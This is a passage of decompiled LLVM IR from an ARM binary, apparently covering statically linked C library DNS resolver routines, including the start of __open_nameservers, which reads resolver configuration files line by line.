  %v4_19378 = add i32 %v3_19374, %v3_19378
  store i32 %v4_19378, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_19384 = call i32 @memcpy()
  %v0_19388 = load i32, i32* @r8, align 4
  %v1_19388 = add i32 %v0_19388, 36
  %v2_19388 = inttoptr i32 %v1_19388 to i32*
  %v3_19388 = load i32, i32* %v2_19388, align 4
  %v1_1938c = add i32 %v3_19388, 1
  br label %dec_label_pc_19390

dec_label_pc_19390:                               ; preds = %dec_label_pc_19310.dec_label_pc_19390_crit_edge, %dec_label_pc_19370
  %v1_19390 = phi i32 [ %v0_19388, %dec_label_pc_19370 ], [ %v1_19390.pre, %dec_label_pc_19310.dec_label_pc_19390_crit_edge ]
  %storemerge5 = phi i32 [ %v1_1938c, %dec_label_pc_19370 ], [ 0, %dec_label_pc_19310.dec_label_pc_19390_crit_edge ]
  %v2_19390 = add i32 %v1_19390, 36
  %v3_19390 = inttoptr i32 %v2_19390 to i32*
  store i32 %storemerge5, i32* %v3_19390, align 4
  br label %dec_label_pc_19394

dec_label_pc_19394:                               ; preds = %dec_label_pc_19348, %dec_label_pc_19304, %dec_label_pc_19390
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_19390 ], [ 0, %dec_label_pc_19348 ], [ %stack_var_-212.2, %dec_label_pc_19304 ]
  %v1_1939c = add i32 %stack_var_-192.0, 1
  %v0_193a4 = load i32, i32* @r5, align 4
  %v2_193a4 = add i32 %v0_193a4, %v5_19274
  store i32 %v2_193a4, i32* @r5, align 4
  br label %dec_label_pc_193a8

dec_label_pc_193a8:                               ; preds = %dec_label_pc_1924c, %dec_label_pc_19394
  %v0_19268 = phi i32 [ %v0_1923c, %dec_label_pc_1924c ], [ %v2_193a4, %dec_label_pc_19394 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_1924c ], [ %stack_var_-212.1, %dec_label_pc_19394 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_1924c ], [ %v1_1939c, %dec_label_pc_19394 ]
  %v2_193b0 = sub i32 %stack_var_-192.0, %tmp155
  %v4_193b0 = xor i32 %stack_var_-192.0, %tmp155
  %v5_193b0 = xor i32 %v2_193b0, %stack_var_-192.0
  %v6_193b0 = and i32 %v5_193b0, %v4_193b0
  %v5_193b4 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_193b4, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_193a8
  %v7_193b4 = load i32, i32* @fp, align 4
  %v8_193b4 = sub i32 %v0_19268, %v7_193b4
  %v10_193b4 = xor i32 %v7_193b4, %v0_19268
  %v11_193b4 = xor i32 %v8_193b4, %v0_19268
  %v12_193b4 = and i32 %v11_193b4, %v10_193b4
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_193a8, %bb204
  %v1_193b8.in = phi i32 [ %v6_193b0, %dec_label_pc_193a8 ], [ %v12_193b4, %bb204 ]
  %v0_193b8.in = phi i32 [ %v2_193b0, %dec_label_pc_193a8 ], [ %v8_193b4, %bb204 ]
  %v0_193b8 = icmp slt i32 %v0_193b8.in, 0
  %v1_193b8 = icmp slt i32 %v1_193b8.in, 0
  %v2_193b8 = xor i1 %v1_193b8, %v0_193b8
  br i1 %v2_193b8, label %dec_label_pc_19260, label %dec_label_pc_193bc

dec_label_pc_193bc:                               ; preds = %dec_label_pc_19290, %bb203, %dec_label_pc_19310, %dec_label_pc_192dc, %bb205
  store i32 %v0_190a0, i32* @r0, align 4
  %v1_193c0 = call i32 @__libc_close(i32 %v0_190a0)
  %v3_193c4 = load i32, i32* %stack_var_0, align 4
  %v2_193c8 = icmp eq i32 %v3_193c4, 0
  br i1 %v2_193c8, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_193bc
  %v1_193d0 = load i32, i32* @r7, align 4
  %v3_193cc = inttoptr i32 %v3_193c4 to i32*
  store i32 %v1_193d0, i32* %v3_193cc, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_193bc
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 103384, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_193c8, i32 ptrtoint (i32* @global_var_134b0.563 to i32))
  %v2_193d8 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_193d8, i32* @r0, align 4
  store i32 %v2_18e6c, i32* @r4, align 4
  %v0_193e0 = call i32 @free()
  store i32 %v2_18e6c, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_301dc.926 to i32), i32* @r2, align 4
  %v1_193f8 = call i32 @__pthread_cleanup_push_defer()
  %v2_19408 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_301dc.926 to i32))
  %v0_19414 = load i32, i32* @r6, align 4
  %v3_19414 = sdiv i32 %v0_19414, 256
  %v0_19418 = load i32, i32* @sl, align 4
  store i32 %v0_19418, i32* @global_var_301f4.931, align 4
  store i32 %v2_18e6c, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v1_19424 = trunc i32 %v3_19414 to i8
  store i8 %v1_19424, i8* @global_var_2b8bd.934, align 1
  %v1_19428 = trunc i32 %v0_19414 to i8
  store i8 %v1_19428, i8* bitcast (i8** @global_var_2b8bc.933 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_19438.944 to i32), i32* @lr, align 4
  %v1_19434 = call i32 @__pthread_cleanup_pop_restore()
  %v0_195c0.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_195c0

dec_label_pc_1943c:                               ; preds = %dec_label_pc_190d0, %dec_label_pc_190f0
  %v0_1943c = load i32, i32* @sl, align 4
  %v1_1943c = add i32 %v0_1943c, 1
  %v2_19444 = srem i32 %v1_1943c, %arg3
  store i32 %v2_19444, i32* @sl, align 4
  %v2_19448 = icmp eq i32 %v2_19444, 0
  br i1 %v2_19448, label %dec_label_pc_19450, label %dec_label_pc_19508.backedge

dec_label_pc_19450:                               ; preds = %dec_label_pc_1943c
  %v1_19458 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_1950c.outer.backedge

dec_label_pc_1950c.outer.backedge:                ; preds = %dec_label_pc_19450, %dec_label_pc_194ec, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_191e4, %.thread19 ], [ -1, %dec_label_pc_194ec ], [ -1, %dec_label_pc_19450 ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_194f4, %dec_label_pc_194ec ], [ %v1_19458, %dec_label_pc_19450 ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_18ef0.lr.ph, label %dec_label_pc_19528

dec_label_pc_19468:                               ; preds = %dec_label_pc_19360
  %v1_19468 = inttoptr i32 %v0_19360 to i32*
  %v2_19468 = load i32, i32* %v1_19468, align 4
  store i32 %v2_19468, i32* @r0, align 4
  %v0_1946c = call i32 @free()
  br label %dec_label_pc_19470

dec_label_pc_19470:                               ; preds = %dec_label_pc_19200, %dec_label_pc_19154, %dec_label_pc_19290, %dec_label_pc_19284, %dec_label_pc_1916c, %dec_label_pc_19134, %dec_label_pc_19468
  br i1 %v2_19474, label %dec_label_pc_1947c, label %dec_label_pc_194d8

dec_label_pc_1947c:                               ; preds = %dec_label_pc_19470
  store i32 %v2_18e6c, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2b8c0.676 to i32), i32* @r2, align 4
  store i32 %v2_18e6c, i32* @r0, align 4
  %v1_19494 = call i32 @__pthread_cleanup_push_defer()
  %v2_194a4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b8c0.676 to i32))
  store i32 1, i32* @r1, align 4
  %v2_194b0 = load i32, i32* @global_var_30334.938, align 4
  store i32 %v2_194b0, i32* @r4, align 4
  store i32 %v2_18e6c, i32* @r0, align 4
  store i32 103620, i32* @lr, align 4
  %v1_194c0 = call i32 @__pthread_cleanup_pop_restore()
  %v0_194c8 = load i32, i32* @r4, align 4
  %v1_194c8 = add i32 %v0_194c8, -1
  store i32 %v1_194c8, i32* @r4, align 4
  %v5_194d0 = icmp slt i32 %v6_194d0, %v1_194c8
  br i1 %v5_194d0, label %.thread27, label %dec_label_pc_194d8

.thread27:                                        ; preds = %dec_label_pc_1947c
  %v7_194d0 = add i32 %v6_194d0, 1
  br label %dec_label_pc_19508.backedge

dec_label_pc_194d8:                               ; preds = %dec_label_pc_1947c, %dec_label_pc_19470
  %v0_194d8 = load i32, i32* @sl, align 4
  %v1_194d8 = add i32 %v0_194d8, 1
  %v2_194e0 = srem i32 %v1_194d8, %arg3
  store i32 %v2_194e0, i32* @sl, align 4
  %v2_194e4 = icmp eq i32 %v2_194e0, 0
  br i1 %v2_194e4, label %dec_label_pc_194ec, label %dec_label_pc_19508.backedge

dec_label_pc_194ec:                               ; preds = %dec_label_pc_194d8
  %v1_194f4 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_1950c.outer.backedge

dec_label_pc_19508.backedge:                      ; preds = %dec_label_pc_1943c, %dec_label_pc_194d8, %.thread27
  %storemerge87 = phi i32 [ %v7_194d0, %.thread27 ], [ -1, %dec_label_pc_194d8 ], [ -1, %dec_label_pc_1943c ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_18ef0.lr.ph.preheader, label %dec_label_pc_19528

dec_label_pc_18ef0.lr.ph.preheader:               ; preds = %dec_label_pc_18ef0.lr.ph.preheader.lr.ph, %dec_label_pc_19508.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_18ef0.lr.ph.preheader.lr.ph ], [ %v0_190a0, %dec_label_pc_19508.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_18ee8, %dec_label_pc_18ef0.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_19508.backedge ]
  %v0_19508259 = phi i32 [ -1, %dec_label_pc_18ef0.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_19508.backedge ]
  br label %dec_label_pc_18ef0.lr.ph

dec_label_pc_18ef0.lr.ph:                         ; preds = %dec_label_pc_18ef0.lr.ph.preheader, %dec_label_pc_1950c.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v0_190a0, %dec_label_pc_1950c.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_18ef0.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_1950c.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_18ef0.lr.ph.preheader ]
  %v6_194d0 = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_1950c.outer.backedge ], [ %v0_19508259, %dec_label_pc_18ef0.lr.ph.preheader ]
  %v1_18f98 = icmp slt i32 %v6_194d0, 0
  %v4_18fd4 = mul i32 %v6_194d0, 4
  %v5_18fd4 = add i32 %v4_18fd4, ptrtoint (i32* @global_var_30314.942 to i32)
  %v6_18fd4 = inttoptr i32 %v5_18fd4 to i32*
  br label %dec_label_pc_18ef0

dec_label_pc_1951c:                               ; preds = %bb195, %.thread8, %dec_label_pc_18e48, %dec_label_pc_18e3c
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_19528

dec_label_pc_19528:                               ; preds = %dec_label_pc_18e58, %dec_label_pc_19508.backedge, %dec_label_pc_1950c.outer.backedge, %bb200, %dec_label_pc_18fe0, %dec_label_pc_1950c.backedge, %dec_label_pc_1951c
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_1951c ], [ %v0_190a0, %dec_label_pc_1950c.backedge ], [ %v1_18ef8, %dec_label_pc_18fe0 ], [ %v1_18ef8, %bb200 ], [ %v0_190a0, %dec_label_pc_1950c.outer.backedge ], [ -1, %dec_label_pc_18e58 ], [ %v0_190a0, %dec_label_pc_19508.backedge ]
  %v0_19528 = call i32 @__GI___h_errno_location()
  %v2_19530 = inttoptr i32 %v0_19528 to i32*
  store i32 -1, i32* %v2_19530, align 4
  %v0_19534 = load i32, i32* @sb, align 4
  store i32 %v0_19534, i32* @r6, align 4
  br label %dec_label_pc_19538

dec_label_pc_19538:                               ; preds = %dec_label_pc_19224, %dec_label_pc_19528
  %v1_19540 = phi i32 [ %stack_var_-216.2, %dec_label_pc_19528 ], [ %v0_190a0, %dec_label_pc_19224 ]
  %v7_1953c = icmp eq i32 %v1_19540, -1
  br i1 %v7_1953c, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_19538
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_19538, %bb208
  store i32 103752, i32* @lr, align 4
  %v1_19544 = xor i1 %v7_1953c, true
  call void @__pseudo_cond_branch(i1 %v1_19544, i32 ptrtoint (i32* @global_var_10014.867 to i32))
  %v2_19548 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_19548, i32* @r0, align 4
  %v0_1954c = call i32 @free()
  %v0_19550 = load i32, i32* @r7, align 4
  store i32 %v0_19550, i32* @r0, align 4
  %v0_19554 = call i32 @free()
  %v0_19558 = load i32, i32* @sl, align 4
  %v7_19558 = icmp eq i32 %v0_19558, -1
  br i1 %v7_19558, label %bb210, label %dec_label_pc_19564

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_195c0

dec_label_pc_19564:                               ; preds = %bb209
  %v2_19564 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_19564, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_301dc.926 to i32), i32* @r2, align 4
  store i32 %v2_19564, i32* @r0, align 4
  %v1_1957c = call i32 @__pthread_cleanup_push_defer()
  %v2_1958c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_301dc.926 to i32))
  %v0_19598 = load i32, i32* @r6, align 4
  %v3_19598 = sdiv i32 %v0_19598, 256
  %v0_1959c = load i32, i32* @sl, align 4
  store i32 %v0_1959c, i32* @global_var_301f4.931, align 4
  store i32 %v2_19564, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v1_195a8 = trunc i32 %v3_19598 to i8
  store i8 %v1_195a8, i8* @global_var_2b8bd.934, align 1
  %v1_195ac = trunc i32 %v0_19598 to i8
  store i8 %v1_195ac, i8* bitcast (i8** @global_var_2b8bc.933 to i8*), align 4
  store i32 103868, i32* @lr, align 4
  %v1_195b8 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_195c0

dec_label_pc_195c0:                               ; preds = %bb210, %bb207, %dec_label_pc_19564
  %v0_195c0 = phi i32 [ %v0_19558, %bb210 ], [ %v0_195c0.pre, %bb207 ], [ -1, %dec_label_pc_19564 ]
  store i32 %v3_18df4, i32* @r4, align 4
  store i32 %v6_18df4, i32* @r5, align 4
  store i32 %v9_18df4, i32* @r6, align 4
  store i32 %v12_18df4, i32* @r7, align 4
  store i32 %v15_18df4, i32* @r8, align 4
  store i32 %v18_18df4, i32* @sb, align 4
  store i32 %v21_18df4, i32* @sl, align 4
  ret i32 %v0_195c0

; uselistorder directives
  uselistorder i32 %v0_19598, { 1, 0 }
  uselistorder i32 %v0_19558, { 1, 0 }
  uselistorder i1 %v7_1953c, { 1, 0 }
  uselistorder i32 %v6_194d0, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v0_19414, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_19268, { 0, 1, 3, 2 }
  uselistorder i32 %v0_19360, { 0, 2, 1, 3 }
  uselistorder i32 %v1_19320, { 1, 0 }
  uselistorder i32 %v0_19240, { 1, 0 }
  uselistorder i32 %v0_19244, { 1, 0 }
  uselistorder i32 %v4_19144, { 1, 0 }
  uselistorder i32 %v1_1912c, { 1, 0, 2 }
  uselistorder i32 %v0_190a0, { 5, 0, 1, 2, 3, 4, 7, 6, 9, 8, 12, 11, 10, 14, 15, 16, 13 }
  uselistorder i32 %v1_1900c, { 1, 0 }
  uselistorder i32 %v2_18fac, { 1, 0 }
  uselistorder i32 %v1_18f24, { 1, 2, 0 }
  uselistorder i1 %v7_18ef4, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_18ef8, { 1, 2, 0 }
  uselistorder i32 %v0_18ee8, { 1, 0 }
  uselistorder i32 %v2_18e6c, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 3, 2, 0, 1 }
  uselistorder i8* %stack_var_-100, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (%pollfd*, i32, i32)* @__libc_poll, { 2, 0, 1 }
  uselistorder i32 101, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 (i32)* @inet_addr, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 5, 0, 1, 4, 3 }
  uselistorder i8* @global_var_2b8bd.934, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_301dc.926 to i32), { 1, 3, 0, 4, 2, 5 }
  uselistorder i32 512, { 4, 5, 6, 3, 7, 2, 8, 9, 10, 11, 1, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_195c0, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_19538, { 1, 0 }
  uselistorder label %dec_label_pc_19528, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_1951c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_18ef0.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19508.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_19470, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_1950c.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1943c, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_193bc, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_193a8, { 1, 0 }
  uselistorder label %dec_label_pc_19394, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19390, { 1, 0 }
  uselistorder label %dec_label_pc_192f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19234, { 1, 0 }
  uselistorder label %dec_label_pc_19224, { 1, 0 }
  uselistorder label %dec_label_pc_1950c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1908c, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_18fe0, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2, i64* %arg3) local_unnamed_addr {
dec_label_pc_195cc:
  %v0_195cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_195cc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_195cc
  %v4_195d0 = load i64, i64* %arg3, align 4
  %v7_195d0 = udiv i64 %v4_195d0, 4294967296
  %v8_195d0 = trunc i64 %v7_195d0 to i32
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_195cc, %bb
  %v10_195fc = phi i32 [ %arg1, %dec_label_pc_195cc ], [ %v8_195d0, %bb ]
  ret i32 %v10_195fc

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_19600 = load i32, i32* @r4, align 4
  store i32 %v3_19600, i32* %stack_var_-28, align 4
  %v6_19600 = load i32, i32* @r5, align 4
  %v9_19600 = load i32, i32* @r6, align 4
  %v12_19600 = load i32, i32* @r7, align 4
  %v15_19600 = load i32, i32* @r8, align 4
  %v18_19600 = load i32, i32* @sl, align 4
  %v2_19604 = ptrtoint i32* %stack_var_-192 to i32
  %v2_19608 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_19608, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2b8c0.676 to i32), i32* @r2, align 4
  %v1_1961c = call i32 @__pthread_cleanup_push_defer()
  store i32 ptrtoint (i32* @global_var_2b8c0.676 to i32), i32* %r0.global-to-local, align 4
  store i32 103984, i32* @lr, align 4
  %v2_1962c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b8c0.676 to i32))
  store i32 %v2_1962c, i32* %r0.global-to-local, align 4
  %v2_19634 = load i32, i32* @global_var_30330.681, align 4
  %v5_1963c = icmp sgt i32 %v2_19634, 0
  br i1 %v5_1963c, label %dec_label_pc_19878, label %dec_label_pc_19640

dec_label_pc_19640:                               ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1e9d4.951 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1e9e8.953 to i32), i32* @r1, align 4
  %v3_19648 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1e9d4.951 to i32), i32 ptrtoint (i32* @global_var_1e9e8.953 to i32))
  store i32 %v3_19648, i32* %r0.global-to-local, align 4
  store i32 %v3_19648, i32* @sl, align 4
  %v2_1964c = icmp eq i32 %v3_19648, 0
  br i1 %v2_1964c, label %dec_label_pc_19654, label %dec_label_pc_19840.preheader

dec_label_pc_19654:                               ; preds = %dec_label_pc_19640
  store i32 ptrtoint ([24 x i8]* @global_var_1e9ec.955 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1e9e8.953 to i32), i32* @r1, align 4
  %v3_1965c = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1e9ec.955 to i32), i32 ptrtoint (i32* @global_var_1e9e8.953 to i32))
  store i32 %v3_1965c, i32* %r0.global-to-local, align 4
  store i32 %v3_1965c, i32* @sl, align 4
  %v2_19660 = icmp eq i32 %v3_1965c, 0
  br i1 %v2_19660, label %dec_label_pc_1986c, label %dec_label_pc_19840.preheader

dec_label_pc_19840.preheader:                     ; preds = %dec_label_pc_19640, %dec_label_pc_19654
  %v0_1984826 = phi i32 [ %v3_19648, %dec_label_pc_19640 ], [ %v3_1965c, %dec_label_pc_19654 ]
  %v2_196b4 = ptrtoint i32* %stack_var_-28 to i32
  %v3_19750 = inttoptr i32 %tmp to i8*
  store i32 %v2_19604, i32* %r0.global-to-local, align 4
  store i32 %v0_1984826, i32* %r2.global-to-local, align 4
  %v3_1984c66 = call i32 @fgets(i32 %v2_19604, i32 128, i32 %v0_1984826)
  store i32 %v3_1984c66, i32* %r0.global-to-local, align 4
  %v2_1985068 = icmp eq i32 %v3_1984c66, 0
  store i32 %v2_19604, i32* @r4, align 4
  br i1 %v2_1985068, label %dec_label_pc_19860, label %dec_label_pc_19670.preheader.lr.ph

dec_label_pc_19670.preheader.lr.ph:               ; preds = %dec_label_pc_19840.preheader
  %v1_1967011 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_19670.preheader

dec_label_pc_1966c:                               ; preds = %dec_label_pc_1967c
  %v1_1966c = add i32 %v0_1966c, 1
  store i32 %v1_1966c, i32* %r0.global-to-local, align 4
  %v1_19670 = inttoptr i32 %v1_1966c to i8*
  %v2_19670 = load i8, i8* %v1_19670, align 1
  %v3_19670 = zext i8 %v2_19670 to i32
  store i32 %v3_19670, i32* %r2.global-to-local, align 4
  %v2_19674 = icmp eq i8 %v2_19670, 0
  br i1 %v2_19674, label %dec_label_pc_19690, label %dec_label_pc_1967c

dec_label_pc_1967c:                               ; preds = %dec_label_pc_1967c.lr.ph, %dec_label_pc_1966c
  %v0_1966c = phi i32 [ %v2_19604, %dec_label_pc_1967c.lr.ph ], [ %v1_1966c, %dec_label_pc_1966c ]
  %v1_19684 = phi i32 [ %v3_1967013, %dec_label_pc_1967c.lr.ph ], [ %v3_19670, %dec_label_pc_1966c ]
  %v3_19684 = mul nuw nsw i32 %v1_19684, 2
  %v4_19684 = add i32 %v3_19684, %v2_19680.pre
  %v5_19684 = inttoptr i32 %v4_19684 to i8*
  %v6_19684 = load i8, i8* %v5_19684, align 1
  %v1_19688 = and i8 %v6_19684, 32
  %v2_19688 = icmp eq i8 %v1_19688, 0
  br i1 %v2_19688, label %dec_label_pc_19690, label %dec_label_pc_1966c

dec_label_pc_19690:                               ; preds = %dec_label_pc_1966c, %dec_label_pc_1967c, %dec_label_pc_19670.preheader
  %v0_1972835 = phi i32 [ %v2_19604, %dec_label_pc_19670.preheader ], [ %v1_1966c, %dec_label_pc_1966c ], [ %v0_1966c, %dec_label_pc_1967c ]
  %v0_196a4 = phi i32 [ %v3_1967013, %dec_label_pc_19670.preheader ], [ %v3_19670, %dec_label_pc_1966c ], [ %v1_19684, %dec_label_pc_1967c ]
  %v7_19690 = icmp eq i32 %v0_196a4, 10
  br i1 %v7_19690, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_19690
  %v3_19694 = icmp eq i32 %v0_196a4, 0
  br i1 %v3_19694, label %bb55, label %dec_label_pc_196a4

.thread3:                                         ; preds = %dec_label_pc_19690
  br label %dec_label_pc_19840.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_19840.backedge

dec_label_pc_19840.backedge:                      ; preds = %dec_label_pc_1981c, %dec_label_pc_19834, %bb55, %dec_label_pc_197b4, %.thread3, %dec_label_pc_196a4
  %v0_19848.pre = load i32, i32* @sl, align 4
  store i32 %v2_19604, i32* %r0.global-to-local, align 4
  store i32 %v0_19848.pre, i32* %r2.global-to-local, align 4
  %v3_1984c = call i32 @fgets(i32 %v2_19604, i32 128, i32 %v0_19848.pre)
  store i32 %v3_1984c, i32* %r0.global-to-local, align 4
  %v2_19850 = icmp eq i32 %v3_1984c, 0
  store i32 %v2_19604, i32* @r4, align 4
  br i1 %v2_19850, label %dec_label_pc_19860, label %dec_label_pc_19670.preheader

dec_label_pc_196a4:                               ; preds = %bb
  %v7_196a4 = icmp eq i32 %v0_196a4, 35
  br i1 %v7_196a4, label %dec_label_pc_19840.backedge, label %dec_label_pc_19728

dec_label_pc_196b4:                               ; preds = %bb58
  store i32 %v2_196b4, i32* %r2.global-to-local, align 4
  %v4_196b8 = mul i32 %storemerge, 4
  %v5_196b8 = add i32 %v4_196b8, %v2_196b4
  %v2_196bc = add i32 %v5_196b8, -36
  %v3_196bc = inttoptr i32 %v2_196bc to i32*
  store i32 %v0_196bc, i32* %v3_196bc, align 4
  %v0_196c815 = load i32, i32* %r0.global-to-local, align 4
  %v1_196c816 = inttoptr i32 %v0_196c815 to i8*
  %v2_196c817 = load i8, i8* %v1_196c816, align 1
  %v3_196c818 = zext i8 %v2_196c817 to i32
  store i32 %v3_196c818, i32* %r2.global-to-local, align 4
  %v2_196cc19 = icmp eq i8 %v2_196c817, 0
  br i1 %v2_196cc19, label %dec_label_pc_196fc.preheader, label %dec_label_pc_196d4.lr.ph

dec_label_pc_196d4.lr.ph:                         ; preds = %dec_label_pc_196b4
  %v2_196d8.pre = load i32, i32* @global_var_2b898, align 4
  br label %dec_label_pc_196d4

dec_label_pc_196c4:                               ; preds = %dec_label_pc_196e8
  %v1_196c4 = add i32 %v0_196c4, 1
  store i32 %v1_196c4, i32* %r0.global-to-local, align 4
  %v1_196c8 = inttoptr i32 %v1_196c4 to i8*
  %v2_196c8 = load i8, i8* %v1_196c8, align 1
  %v3_196c8 = zext i8 %v2_196c8 to i32
  store i32 %v3_196c8, i32* %r2.global-to-local, align 4
  %v2_196cc = icmp eq i8 %v2_196c8, 0
  br i1 %v2_196cc, label %dec_label_pc_196fc.preheader, label %dec_label_pc_196d4

dec_label_pc_196d4:                               ; preds = %dec_label_pc_196d4.lr.ph, %dec_label_pc_196c4
  %v0_196c4 = phi i32 [ %v0_196c815, %dec_label_pc_196d4.lr.ph ], [ %v1_196c4, %dec_label_pc_196c4 ]
  %v0_196e8 = phi i32 [ %v3_196c818, %dec_label_pc_196d4.lr.ph ], [ %v3_196c8, %dec_label_pc_196c4 ]
  %v3_196dc = mul nuw nsw i32 %v0_196e8, 2
  %v4_196dc = add i32 %v3_196dc, %v2_196d8.pre
  %v5_196dc = inttoptr i32 %v4_196dc to i8*
  %v6_196dc = load i8, i8* %v5_196dc, align 1
  %v1_196e0 = and i8 %v6_196dc, 32
  %v2_196e0 = icmp eq i8 %v1_196e0, 0
  br i1 %v2_196e0, label %dec_label_pc_196e8, label %dec_label_pc_196fc.preheader

dec_label_pc_196e8:                               ; preds = %dec_label_pc_196d4
  %v7_196e8 = icmp eq i32 %v0_196e8, 10
  br i1 %v7_196e8, label %dec_label_pc_196fc.preheader, label %dec_label_pc_196c4

